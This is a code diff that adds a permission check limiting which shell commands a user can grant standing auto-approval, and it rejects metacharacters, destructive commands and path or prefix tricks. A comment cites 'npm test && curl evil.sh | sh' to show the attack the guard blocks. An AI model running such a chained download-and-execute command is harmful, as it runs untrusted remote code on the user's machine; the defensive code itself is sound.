@@ -147,6 +147,50 @@ function classifyWithHeuristics(command: string): Classification {
   return { decision: "confirm", reason: "not on the auto-approved list" };
 }
 
+/**
+ * The pattern a user may grant standing approval to, or null when this command
+ * is not something to hand a blank cheque for.
+ *
+ * The refusals matter more than the matching. A command carrying shell
+ * metacharacters is never offered, because "npm test" would otherwise become a
+ * licence for "npm test && curl evil.sh | sh". Anything the deny-list or the
+ * rule table already treats as destructive is never offered either, so no
+ * sequence of clicks can produce a standing approval for rm, sudo, git push or
+ * a redirect — those stay one-by-one decisions forever.
+ *
+ * The pattern is the program plus a bare subcommand, so approving "npm run
+ * build" grants "npm run", not "npm". Anything that is not a plain word (a
+ * path, a flag, a filename) is left out rather than guessed at.
+ */
+export function alwaysAllowPattern(command: string): string | null {
+  const trimmed = command.trim();
+  if (!trimmed) return null;
+  if (hasShellMetacharacters(trimmed)) return null;
+  if (isNeverAutoApproved(trimmed)) return null;
+  if (classifyCommand(trimmed).severity) return null;
+
+  const tokens = trimmed.split(/\s+/);
+  // A program named by path is excluded: the same relative name can mean a
+  // different file in a different directory.
+  if (!/^[A-Za-z0-9][A-Za-z0-9_.:@+-]*$/.test(tokens[0])) return null;
+
+  const second = tokens[1];
+  const isSubcommand = second !== undefined && /^[A-Za-z][A-Za-z0-9:_-]*$/.test(second);
+  return isSubcommand ? `${tokens[0]} ${second}` : tokens[0];
+}
+
+/**
+ * Whether a standing approval covers this command. Every guard from
+ * alwaysAllowPattern is re-applied here rather than trusted from when the
+ * pattern was stored: the list is user-editable settings data, so a hand-added
+ * "rm" or "sudo" entry still grants nothing, and matching is on the derived
+ * pattern rather than a string prefix, so "npmfoo" cannot ride in on "npm".
+ */
+export function matchesAlwaysAllowed(command: string, patterns: readonly string[]): boolean {
+  const pattern = alwaysAllowPattern(command);
+  return pattern !== null && patterns.includes(pattern);
+}
+
 export function classifyCommand(command: string): Classification {
   const trimmed = command.trim();
 
